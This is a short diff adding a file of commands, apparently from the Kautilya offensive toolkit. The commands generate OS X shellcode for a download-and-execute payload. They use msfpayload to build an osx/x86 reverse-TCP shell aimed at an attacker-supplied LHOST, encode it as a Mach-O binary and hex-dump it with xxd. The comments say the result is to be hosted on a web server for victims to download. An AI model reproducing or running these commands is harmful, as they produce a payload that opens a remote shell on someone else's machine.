@@ -1,0 +1,6 @@
+
+#Use these commands to generate shellcode for OS X Download an Execute payload of Kautilya. You need xxd installed on your machine to run this.
+#The generated shellcode should hosted on a web server so that it could be downloaded.
+
+./msfpayload osx/x86/shell_reverse_tcp LHOST=<IP> R | ./msfencode -a x86 -t macho -o osx_payload 
+xxd -ps osx_payload > osx_codeexec.txt
